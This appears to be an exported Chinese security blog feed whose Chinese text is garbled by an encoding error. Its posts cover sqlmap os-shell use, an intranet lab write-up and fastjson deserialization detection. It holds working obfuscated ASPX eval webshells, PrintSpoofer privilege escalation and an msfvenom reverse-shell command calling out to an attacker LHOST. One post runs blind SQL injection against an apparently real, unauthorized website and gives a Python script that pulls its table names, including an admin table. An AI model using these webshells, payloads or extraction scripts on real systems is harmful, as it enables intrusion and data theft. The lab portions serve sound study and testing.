class="string">&quot;/*!UNION/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&quot;/*!SELECT/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;USER()&quot;</span>,<span class="string">&quot;/*!USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;DATABASE()&quot;</span>,<span class="string">&quot;/*!DATABASE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;VERSION()&quot;</span>,<span class="string">&quot;/*!VERSION/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SESSION_USER()&quot;</span>,<span class="string">&quot;/*!SESSION_USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>,<span class="string">&quot;/*!EXTRACTVALUE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UPDATEXML&quot;</span>,<span class="string">&quot;/*!UPDATEXML/*!/*/**/*/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapos-shellä½¿ç”¨</title>
    <url>/posts/a92f908a/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h3><p>phpstudy + sqlilab æœ¬åœ°æµ‹è¯•</p>
<br>

<h3 id="os-shell-æ¡ä»¶"><a href="#os-shell-æ¡ä»¶" class="headerlink" title="os-shell æ¡ä»¶"></a>os-shell æ¡ä»¶</h3><ol>
<li>ç½‘ç«™å¿…é¡»ä¸ºrootæƒé™</li>
<li>çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„</li>
<li>PHPå…³é—­é­”æœ¯å¼•å·(GPC)ï¼Œphpä¸»åŠ¨è½¬ä¹‰åŠŸèƒ½å…³é—­</li>
<li>secure_file_priv= å€¼ä¸ºç©º</li>
</ol>
<br>

<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><h4 id="æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba"><a href="#æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba" class="headerlink" title="æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba"></a>æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
<p>current user is DBA: True</p>
<p><img src="/posts/a92f908a/id_dba.png"></p>
<br>

<h4 id="å¯»æ‰¾ç»å¯¹è·¯å¾„"><a href="#å¯»æ‰¾ç»å¯¹è·¯å¾„" class="headerlink" title="å¯»æ‰¾ç»å¯¹è·¯å¾„"></a>å¯»æ‰¾ç»å¯¹è·¯å¾„</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
<p><code>select @@datadir</code></p>
<p><img src="/posts/a92f908a/dir.png"></p>
<p>select @@datadir: â€˜D:\phpstudy_pro\Extensions\MySQL5.7.26\data\â€˜</p>
<p>å¯ä»¥æ¨æµ‹åˆ° ç½‘ç«™æ ¹ç›®å½• <code>D:\phpstudy_pro\WWW</code></p>
<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
<p>å¡«å…¥ç»å¯¹è·¯å¾„</p>
<p><img src="/posts/a92f908a/os_shell.png"></p>
<p><img src="/posts/a92f908a/shell.png"></p>
<br>

<br>

<h3 id="å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•"><a href="#å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•" class="headerlink" title="å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•:"></a>å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•:</h3><ul>
<li>é€šè¿‡ç½‘ç«™æŠ¥é”™æŸ¥çœ‹ç»å¯¹è·¯å¾„</li>
<li>æ ¹æ®phpinfo æ¢é’ˆæŸ¥çœ‹ä¿¡æ¯</li>
<li>é…åˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´  å¦‚eval() ä¼ å…¥phpinfo()</li>
<li>æ ¹æ®é…ç½®æ–‡ä»¶è·å–è·¯å¾„ </li>
<li>é€šè¿‡æœç´¢å¼•æ“è·å– <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
</ul>
]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliç½‘ç»œä¸å¯è¾¾</title>
    <url>/posts/5150e44b/</url>
    <content><![CDATA[<p>å‡ºç°é”™è¯¯ ç½‘ç»œä¸å¯è¾¾ </p>
<p>è§£å†³æ–¹æ³• æ‰“å¼€ç½‘å¡é…ç½®æ–‡ä»¶ <code>sudo vim /etc/network/interfaces</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5)ï¼Œ</span><br><span class="line"></span><br><span class="line">source /etc/network/ interfaces.d/*</span><br><span class="line"></span><br><span class="line">#The Loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet Loopback</span><br></pre></td></tr></table></figure>

<p>åœ¨åé¢æ·»åŠ ä¸¤è¡Œä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜é€€å‡ºé‡å¯å³å¯</p>
<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://developer.huaweicloud.com/hero/thread-69909-1-1.html">https://developer.huaweicloud.com/hero/thread-69909-1-1.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>æš—æœˆå†…ç½‘é¶æœºWP</title>
    <url>/posts/ab4fb19a/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>webæœåŠ¡å™¨  </p>
<p>192.168.0.114 ï¼ˆæœ¬åœ°ä½¿ç”¨natï¼‰ </p>
<p>10.10.131(Vm18) å¼€å¯é˜²ç«å¢™ å®‰å…¨ç‹— å’Œwindowsè‡ªå¸¦æ€è½¯</p>
<p>OAç³»ç»Ÿ</p>
<p>10.10.1.130ï¼ˆVM18ï¼‰</p>
<p>10.10.10.166ï¼ˆVM19ï¼‰å¼€å¯é˜²ç«å¢™ 360å…¨å®¶æ¡¶</p>
<p>åŸŸæ§dc</p>
<p>10.10.10.165ï¼ˆVM19ï¼‰ æ— é˜²æŠ¤è½¯ä»¶</p>
<p><img src="/posts/ab4fb19a/tuopu.png"></p>
<br>

<p>3å°æœºå™¨å¯†ç </p>
<p>win2016-web     <code>!@#QWE123</code></p>
<p>win2016-dc        <code>!@#QWE123.</code></p>
<p>win2012 oa        <code>!@#Q123</code></p>
<br>

<p>ç›®çš„ :è·å–åŸŸæ§ä¸­çš„flag.txtå†…å®¹</p>
<br>

<p>å…ˆä¿®æ”¹hostæ–‡ä»¶ ç»‘å®šipå’ŒåŸŸå 192.168.0.144 <a href="http://www.moonlab.com/">www.moonlab.com</a></p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>nmapæ‰«ä¸€ä¸‹ç«¯å£</p>
<p><code>sudo nmap -sV -p- 192.168.0.114</code> å¼€æ”¾äº†21 90 999 3389 5985 6588ç«¯å£</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sV -p- 192.168.0.114<br>[sudo] kali çš„å¯†ç ï¼š<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-06-16 10:55 CST<br>Nmap scan report for <a href="http://www.moonlab.com/">www.moonlab.com</a> (192.168.0.114)<br>Host is up (0.00040s latency).<br>Not shown: 65529 filtered ports<br>PORT     STATE SERVICE       VERSION<br>21/tcp   open  ftp           Microsoft ftpd<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>999/tcp  open  http          Microsoft IIS httpd 10.0<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>6588/tcp open  http          Microsoft IIS httpd 10.0<br>MAC Address: 00:0C:29:36:38:42 (VMware)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 123.13 seconds</p>
</blockquote>
<p>çœ‹ä¸‹robots.txt</p>
<blockquote>
<p>User-agent: *<br>Disallow: /SiteServer/<br>Disallow: /SiteFiles/<br>Disallow: /UserCenter/</p>
</blockquote>
<p>è®¿é—®<code>http://www.moonlab.com/siteserver</code>çœ‹åˆ°ä¸€ä¸ªç®¡ç†å‘˜ç™»é™†é¡µé¢ï¼Œä½¿ç”¨çš„æ˜¯siteserver cms</p>
<p>ç³»ç»Ÿç‰ˆæœ¬ï¼š3.6.4 .NET ç‰ˆæœ¬ï¼š2.0 æ•°æ®åº“ï¼šSqlServer </p>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>å»ç½‘ä¸ŠæŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³æ¼æ´ã€‚</p>
<p>å‘ç°SiteServer cmså­˜åœ¨ç®¡ç†å‘˜å¯†ç æ‰¾å›æ¼æ´ï¼Œåªéœ€è¦å…³é—­js ç„¶åè¾“å…¥admin ç‚¹å‡»ä¸‹ä¸€æ­¥å³å¯å¾—åˆ°ç®¡ç†å‘˜å¯†ç </p>
<p><img src="/posts/ab4fb19a/1.png"></p>
<p><img src="/posts/ab4fb19a/2.png"></p>
<p><img src="/posts/ab4fb19a/3.png"></p>
<p>å¾—åˆ°å¯†ç ä¸º admin5566 æˆåŠŸç™»å½•åˆ°åå°</p>
<h4 id="ä¸Šä¼ webshell"><a href="#ä¸Šä¼ webshell" class="headerlink" title="ä¸Šä¼ webshell"></a>ä¸Šä¼ webshell</h4><p>è€ƒè™‘ç›´æ¥åœ¨ç«™ç‚¹æ–‡ä»¶ç®¡ç†å¤„ ä¸Šä¼ ä¸€ä¸ªaspxçš„ä¸€å¥è¯ï¼Œä½†æ˜¯è¢«å®‰å…¨ç‹—æ‹¦æˆªäº†</p>
<p>çœ‹åˆ°æœ‰.aspxçš„æ–‡ä»¶ ç›´æ¥è¿›è¡Œç¼–è¾‘ä¿®æ”¹,ç„¶åå°è¯•è¿æ¥ä¸€å¥è¯ï¼Œå¯†ç ä¸º 1  ï¼ŒæˆåŠŸä½¿ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/posts/ab4fb19a/ant4.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var SE=Request.Form[&quot;1&quot;];</span><br><span class="line">var SMQ=&quot;unsa&quot;,FWJVPDC=&quot;fe&quot;,PZEGHR=SMQ+FWJVPDC;</span><br><span class="line">function AJHB()</span><br><span class="line">&#123;</span><br><span class="line">return SE;</span><br><span class="line">&#125;</span><br><span class="line">function NCBRJ()</span><br><span class="line">&#123;</span><br><span class="line">    eval(AJHB(),PZEGHR);</span><br><span class="line">&#125;</span><br><span class="line">NCBRJ()</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>ä¹Ÿå¯ä»¥åœ¨æ¨¡å—ç®¡ç†å¤„ä¸Šä¼ ,åœ¨ç½‘ä¸Šæ‰¾äº†ä¸ªaspxä¸€å¥è¯å…æ€ï¼Œå¯†ç ä¸ºM</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;% var p = Request.Item[&quot;M&quot;]; var a = p.substring(0,1); var b = p.substring(1,99999); var c = &quot;un&quot; + Char ( 115 ) + Char ( 97 ) + &quot;fe&quot;; eval(a+b,c);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ç«™ç‚¹æ–‡ä»¶ç®¡ç† å¯ä»¥æ‰¾åˆ°ä¸€å¥è¯ä¸Šä¼ çš„è·¯å¾„ ä¸º æ ¹ç›®å½•\SiteFiles\SiteTemplates\1\ </p>
<p><img src="/posts/ab4fb19a/4.png"></p>
<br>

<p>ä½¿ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/posts/ab4fb19a/ant1.png"></p>
<p>whoami æ˜¾ç¤ºä¸º <code>iis apppool\moonlab</code></p>
<p>systeminfo æŸ¥çœ‹å€¼æ‰“äº†ä¸¤ä¸ªè¡¥ä¸</p>
<p>tasklist /svc æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹ï¼ŒæŸ¥çœ‹å­˜åœ¨ä»€ä¹ˆæ€è½¯ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨å®‰å…¨ç‹—</p>
<p>netstat -ano æŸ¥çœ‹æœ¬æœºå¼€æ”¾ç«¯å£</p>
<p>net start æŸ¥çœ‹å·²ç»å¯åŠ¨çš„windowsæœåŠ¡</p>
<blockquote>
<p>   Safedog Guard Center<br>   Safedog Update Center<br>   SafeDogCloudHelper</p>
</blockquote>
<p><img src="/posts/ab4fb19a/ant3.png"></p>
<br>

<h4 id="åˆ©ç”¨PrintSpoofer-ææƒ"><a href="#åˆ©ç”¨PrintSpoofer-ææƒ" class="headerlink" title="åˆ©ç”¨PrintSpoofer ææƒ"></a>åˆ©ç”¨PrintSpoofer ææƒ</h4><p>å°† PrintSpoofer.exe ä¸Šä¼ åˆ° windows/Temp ä¸­</p>
<p>PrintSpoofer64.exe -h æŸ¥çœ‹å¸®åŠ©</p>
<p>![PrintSpoofer1.PNG]</p>
<p>PrintSpoofer64.exe -i -c â€œwhoamiâ€</p>
<p><img src="/posts/ab4fb19a/PrintSpoofer2.png"></p>
<p>æˆåŠŸæ‰§è¡Œ systemæƒé™</p>
<br>

<hr>
<p>åç»­è¿˜æœªå®Œæˆâ€¦..</p>
<h4 id="msfç”Ÿæˆpayload"><a href="#msfç”Ÿæˆpayload" class="headerlink" title="msfç”Ÿæˆpayload"></a>msfç”Ÿæˆpayload</h4><br>

<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.128  LPORT=2333 -e x86/shikata_ga_nai  -i 20 -f csharp -o 1.txt</code></p>
]]></content>
      <categories>
        <category>moon</category>
      </categories>
      <tags>
        <tag>moon</tag>
      </tags>
  </entry>
  <entry>
    <title>phpmyadminæ¼æ´å¤ç°(å¾…å®Œæˆ)</title>
    <url>/posts/89c61231/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>æŸç½‘ç«™sqlç›²æ³¨</title>
    <url>/posts/a615296a/</url>
    <content><![CDATA[<p><code>http://www.xxxxxx.com/products.php?id=113</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=114-1</code>  ä¸¤é¡µé¢æ˜¾ç¤ºç›¸åŒ</p>
<p>å°è¯•é—­åˆ</p>
<p><code>http://www.xxxxxx.com/products.php?id=113&#39;</code>  é¡µé¢æ˜¾ç¤ºé”™è¯¯</p>
<p>ä½¿ç”¨ â€œ â€˜ ) ç­‰é—­åˆå¤–åŠ æ³¨é‡Šä¹Ÿæ˜¾ç¤ºé”™è¯¯</p>
<p>æµ‹è¯•å‘ç°ä¸éœ€è¦è¿›è¡Œé—­åˆ</p>
<br>

<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=1</code> é¡µé¢æ­£å¸¸</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=2</code> é¡µé¢é”™è¯¯</p>
<p>ä½¿ç”¨order by æµ‹å­—æ®µæ•°</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 order by 2</code> å‘ç°æ— å›æ˜¾</p>
<p>æ¨æµ‹æ˜¯ç›²æ³¨</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20sleep(3)</code> ä¼šå»¶æ—¶</p>
<p>åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20left(version(),6)=%275.5.46%27</code> å¾—åˆ° ä¸ºmysql 5.5.46</p>
<p>åˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())&gt;5</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())=6</code></p>
<p>å¾—åˆ°é•¿åº¦ä¸º6ä½</p>
<p>çŒœè§£æ•°æ®åº“</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))&gt;114</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))=115</code></p>
<p>åˆ¤æ–­å‡ºç¬¬ä¸€ä½ä¸º 115 å¯¹åº” s</p>
<p>å¾—åˆ°æ•°æ®åº“åä¸º skytex</p>
<p>åˆ¤æ–­è¡¨é•¿åº¦</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5</code></p>
<p>å¾—åˆ°ç¬¬ä¸€å¼ è¡¨é•¿åº¦ä¸º5</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=10</code></p>
<br>

<p>ç¬¬nå¼ è¡¨</p>
<p><code>length((select table_name from information_schema.tables where table_schema=database() limit &#123;n&#125;,1))&gt;&#123;m&#125;</code></p>
<p>è·‘è¡¨å†…å®¹</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#39;skytex&#39; limit 0,1),1,1))=97</code></p>
<p>ç¬¬ä¸€å¼ è¡¨ä¸º atype</p>
<p>ç¬¬äºŒå¼ è¡¨ä¸º atypeainfo</p>
<p>â€¦ â€¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.xxxxxx.com/products.php/&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment">#å¤§/å°å†™å­—æ¯å’Œæ•°å­—çš„asciiï¼Œlen=62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“é•¿åº¦ä½6</span></span><br><span class="line"><span class="comment"># ç¬¬ä¸€å¼ è¡¨é•¿ 5 ç¬¬äºŒå¼ è¡¨é•¿ 10 ç¬¬ä¸‰å¼ è¡¨ä¸º 8 ç¬¬å››å¼ è¡¨ 9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  <span class="comment">#æ”¹å˜è¿™é‡Œé•¿åº¦</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># äºŒåˆ†æ³•åˆ¤æ–­</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;  #æ•°æ®åº“ä¸º skytex</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 0,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #ç¬¬ä¸€å¼ è¡¨ atype</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 1,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #ç¬¬äºŒå¼ è¡¨ atypeinfo</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #ç¬¬ä¸‰å¼ è¡¨ feedback</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 3,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>&quot;</span>    <span class="comment">#ç¬¬å››å¼ è¡¨ webadmin</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;PZ-CAP&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå®‰è£…java8</title>
    <url>/posts/6cf74356/</url>
    <content><![CDATA[<h3 id="å®˜ç½‘ä¸‹è½½"><a href="#å®˜ç½‘ä¸‹è½½" class="headerlink" title="å®˜ç½‘ä¸‹è½½"></a>å®˜ç½‘ä¸‹è½½</h3><p><code>https://www.oracle.com/technetwork/java/javase/downloads/index.html</code> é€‰æ‹©ä¸‹è½½java8 æœ€æ–°ç‰ˆä¸º<code>jdk-8u291-linux-x64.tar.gz</code></p>
<h3 id="Jdk-ä¼ åˆ°kaliå¹¶è§£å‹"><a href="#Jdk-ä¼ åˆ°kaliå¹¶è§£å‹" class="headerlink" title="Jdk ä¼ åˆ°kaliå¹¶è§£å‹"></a>Jdk ä¼ åˆ°kaliå¹¶è§£å‹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/java</span><br><span class="line">mv jdk-8u291-linux-x64.tar.gz /usr/local/java</span><br><span class="line">cd /usr/local/java</span><br><span class="line">sudo tar -zxvf jdk-8u281-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…å¹¶æ³¨å†Œ"><a href="#å®‰è£…å¹¶æ³¨å†Œ" class="headerlink" title="å®‰è£…å¹¶æ³¨å†Œ"></a>å®‰è£…å¹¶æ³¨å†Œ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /usr/local/java/jdk1.8.0_291/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/local/java/jdk1.8.0_291/bin/javac 1</span><br><span class="line">update-alternatives --set java /usr/local/java/jdk1.8.0_291/bin/java</span><br><span class="line">update-alternatives --set javac /usr/local/java/jdk1.8.0_291/bin/javac</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹javaç‰ˆæœ¬"><a href="#æŸ¥çœ‹javaç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹javaç‰ˆæœ¬"></a>æŸ¥çœ‹javaç‰ˆæœ¬</h3><p><code>java -version</code></p>
<blockquote>
<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<p>java version â€œ1.8.0_291â€<br>Java(TM) SE Runtime Environment (build 1.8.0_291-b10)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)</p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjsonååºåˆ—åŒ–å¤ç°</title>
    <url>/posts/37afa0e0/</url>
    <content><![CDATA[<h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>fastjson æ˜¯ä¸€æ¬¾é˜¿é‡Œçš„å¼€æºjavaåº“ï¼Œç”¨æ¥å®ç°java å¯¹è±¡ä¸jsonå­—ç¬¦ä¸²ä¹‹é—´çš„ç›¸äº’è½¬åŒ–</p>
<p>ååºåˆ—åŒ–å¸¸ç”¨çš„ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºrmi(Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨)ï¼Œä¸€ç§æ˜¯åŸºäºldapã€‚</p>
<p>@typeå¤„å¯ä»¥åšååºåˆ—åŒ– åšååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„setæ–¹æ³•<br>ä½¿ç”¨ JdbcRowSetImpl ä»è¿œç¨‹æœåŠ¡å™¨ä¸ŠåŠ è½½æœåŠ¡å™¨ç«¯çš„ç±» ä»è€Œæ‰§è¡Œæ¶æ„ä»£ç </p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>é¶æœº vulhub-fastjson-1.2.24</p>
<p>ipï¼š192.168.20.128</p>
<p>kaliï¼š192.168.20.129</p>
<p><code>docker-compose up -d</code> è®¿é—®<code>192.168.20.128:8090</code></p>
<h4 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h4><h5 id="DNSLogå›æ˜¾"><a href="#DNSLogå›æ˜¾" class="headerlink" title="DNSLogå›æ˜¾"></a>DNSLogå›æ˜¾</h5><p>æ„é€ POSTè¯·æ±‚åŒ…ï¼Œfastjsonå¯ä»¥è§£æpayloadä¸­valçš„å€¼ï¼Œå¦‚æœdnslogæœ‰å›æ˜¾å³ä¸ºfastjson</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>

<br>

